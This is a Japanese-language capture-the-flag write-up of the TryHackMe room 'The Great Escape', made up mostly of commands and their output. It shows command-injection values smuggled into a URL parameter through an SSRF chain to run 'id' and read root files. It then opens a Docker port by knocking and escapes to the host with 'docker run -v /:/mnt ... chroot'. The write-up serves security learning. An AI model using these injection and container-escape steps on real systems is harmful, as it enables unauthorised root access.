# The Great Escape CTF

https://tryhackme.com/room/thegreatescape

## Enumeration

```shell
TARGET=10.10.101.43
```

### ポートスキャン

```shell
root@ip-10-10-19-83:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-12 07:37 BST
Nmap scan report for 10.10.101.43
Host is up (0.00052s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:EF:70:87:E0:85 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

### gobuster

```sh
root@ip-10-10-19-83:~# gobuster dir -x=txt,php -b 503 --exclude-length 3834 -u http://$TARGET -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.101.43
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   503
[+] Exclude Length:          3834
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 301) [Size: 169] [--> http://10.10.101.43/api/]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

robots.txt があった。gobuster でも dirsearch でも出てこなかった理由は不明。  
→ [公式ウォークスルー](https://blog.hydrashead.net/posts/thm-the-great-escape/)によると、レート制限があったとのこと。

```
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
```

.bak.txt$ をファジングしたが何もでなかった。ただし、robots.txt が検出できなかったのと同じ原因かもしれない。

```sh
$ ffuf -u http://10.10.101.43/FUZZ.bak.txt$ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 3834

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.101.43/FUZZ.bak.txt$
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3834
________________________________________________

:: Progress: [4744/4744] :: Job [1/1] :: 21 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

/exif-util は画像をアップロードするアプリケーション。

URL 指定すると下記のリクエストが出ていた。ffuf によるファジングが使えるのであれば調査する価値があるが・・・

```HTTP
GET /api/exif?url=http:%2F%2Flocalhost:80%2F HTTP/1.1
Host: 10.10.101.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.10.101.43/exif-util/
Cookie: auth.strategy=local; auth.redirect=%2Fadmin; auth._token.local=false; auth._token_expiration.local=false
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache
```

公式ウォークスルーの答えを見た。これは知らなかったのでどうしようもなかった。

```sh
$ curl -v http://10.10.101.43/.well-known/security.txt
*   Trying 10.10.101.43:80...
* Connected to 10.10.101.43 (10.10.101.43) port 80
* using HTTP/1.x
> GET /.well-known/security.txt HTTP/1.1
> Host: 10.10.101.43
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.19.6
< Date: Thu, 12 Jun 2025 07:57:32 GMT
< Content-Type: text/plain
< Content-Length: 251
< Last-Modified: Wed, 06 Jan 2021 18:42:50 GMT
< Connection: keep-alive
< ETag: "5ff604aa-fb"
< Accept-Ranges: bytes
<
Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/[REDACTED] with a HEAD request for a nifty treat.
* Connection #0 to host 10.10.101.43 left intact
```

指示通りに HEAD リクエスト。

```sh
$ curl -v --head http://10.10.101.43/api/[REDACTED]
*   Trying 10.10.101.43:80...
* Connected to 10.10.101.43 (10.10.101.43) port 80
* using HTTP/1.x
> HEAD /api/[REDACTED] HTTP/1.1
> Host: 10.10.101.43
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: nginx/1.19.6
Server: nginx/1.19.6
< Date: Thu, 12 Jun 2025 08:01:00 GMT
Date: Thu, 12 Jun 2025 08:01:00 GMT
< Connection: keep-alive
Connection: keep-alive
< flag: THM{.....................................}
flag: THM{.....................................}
<

* Connection #0 to host 10.10.101.43 left intact
```

しかしフラグが手に入ったとて、シェル取得の役には立たない。

このバックアップファイルがある。  
http://10.10.101.43/exif-util.bak.txt

```js
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>
```

`{{ response }}` の部分から、SSTI が有望と考えた。

```sh
$ cat ./ssti-1
7*'7'
```

http://my-ip/ssti-1 を URL 欄に入れてリクエストさせたが、そのまま表示されただけだった。

```
An error occurred: File format could not be determined
        Retrieved Content
        ----------------------------------------
        7*'7'
```

api-dev-backup:8080 の方の url パラメータには、コマンドインジェクションの脆弱性が存在する。

```sh
$ curl -v "http://10.10.101.43/api/exif?url=http://api-dev-backup:8080/exif?url=1;id"
*   Trying 10.10.101.43:80...
* Connected to 10.10.101.43 (10.10.101.43) port 80
* using HTTP/1.x
> GET /api/exif?url=http://api-dev-backup:8080/exif?url=1;id HTTP/1.1
> Host: 10.10.101.43
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.19.6
< Date: Thu, 12 Jun 2025 08:48:59 GMT
< Content-Type: text/plain;charset=UTF-8
< Content-Length: 360
< Connection: keep-alive
<
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               uid=0(root) gid=0(root) groups=0(root)
* Connection #0 to host 10.10.101.43 left intact
```

何かのパスワードが書かれたファイルがあった。しかし使いどころは不明。

```sh
$ curl "http://10.10.101.43/api/exif?url=http://api-dev-backup:8080/exif?url=1;cat%20/root/dev-note.txt"
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is [REDACTED]

Cheers,

Hydra
```

/root に .git ディレクトリがある。

git log

```
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
* Connection #0 to host 10.10.39.222 left intact
```

git diff a3d30a7d0510dc6565ff9316e3fb84434916dee8

```
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               diff --git a/dev-note.txt b/dev-note.txt
index 89dcd01..efadf5b 100644
--- a/dev-note.txt
+++ b/dev-note.txt
@@ -1,8 +1,8 @@
 Hey guys,

-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+Anyways, the password is [REDACTED]

 Cheers,

diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index aae8129..0000000
--- a/flag.txt
+++ /dev/null
@@ -1,3 +0,0 @@
-You found the root flag, or did you?
-
-THM{.................................}
\ No newline at end of file
* Connection #0 to host 10.10.39.222 left intact
```

ゲストルートフラグ入手。

## Docker エスケープ

フラグと一緒にポートノッキングのヒントが書かれていた。

```
-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
```

```sh
knock -d 100 10.10.39.222 42 1337 10420 6969 63000
```

では開かなかった。telnet で開いた。TCP SYN だけではノックとみなされなかった？

```sh
telnet 10.10.39.222 42
telnet 10.10.39.222 1337
telnet 10.10.39.222 10420
telnet 10.10.39.222 6969
telnet 10.10.39.222 63000
```

ポートスキャン。Docker エンジンの 2375 ポートが開いた。

```sh
root@ip-10-10-182-216:~# sudo nmap -sS -p- 10.10.39.222
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-13 05:41 BST
Nmap scan report for 10.10.39.222
Host is up (0.00041s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2375/tcp open  docker
MAC Address: 02:77:A2:F9:5E:0B (Unknown)
```

リモート実行可能。

```sh
$ docker -H tcp://10.10.39.222:2375 ps
CONTAINER ID   IMAGE          COMMAND                  CREATED       STATUS          PORTS                  NAMES
49fe455a9681   frontend       "/docker-entrypoint.…"   4 years ago   Up 41 minutes   0.0.0.0:80->80/tcp     dockerescapecompose_frontend_1
4b51f5742aad   exif-api-dev   "./application -Dqua…"   4 years ago   Up 41 minutes                          dockerescapecompose_api-dev-backup_1
cb83912607b9   exif-api       "./application -Dqua…"   4 years ago   Up 41 minutes   8080/tcp               dockerescapecompose_api_1
548b701caa56   endlessh       "/endlessh -v"           4 years ago   Up 41 minutes   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1
```

イメージを列挙。

```sh
$ docker -H tcp://10.10.39.222:2375 images
REPOSITORY                                    TAG       IMAGE ID       CREATED       SIZE
exif-api-dev                                  latest    4084cb55e1c7   4 years ago   214MB
exif-api                                      latest    923c5821b907   4 years ago   163MB
frontend                                      latest    577f9da1362e   4 years ago   138MB
endlessh                                      latest    7bde5182dc5e   4 years ago   5.67MB
nginx                                         latest    ae2feff98a0c   4 years ago   133MB
debian                                        10-slim   4a9cd57610d6   4 years ago   69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   4 years ago   103MB
alpine                                        3.9       78a2ce922f86   5 years ago   5.55MB
```

alpine はローカルにイメージが無くエラーになったので、frontend を使用してホスト OS のシェルを取る。

```sh
$ docker -H tcp://10.10.39.222:2375 run -v /:/mnt --rm -it frontend chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

```sh
# cat /root/flag.txt
Congrats, you found the real flag!

THM{..................................}
```

## 振り返り

- 全体的に機械的なファジングが無効化されて、ひらめきが必要なタイプのギャップが多く、非常に難しく感じた。
- `/.well-known/security.txt` は知らなかったので覚えておく。
- telnet を使ってポートノッキングができることを学んだ。
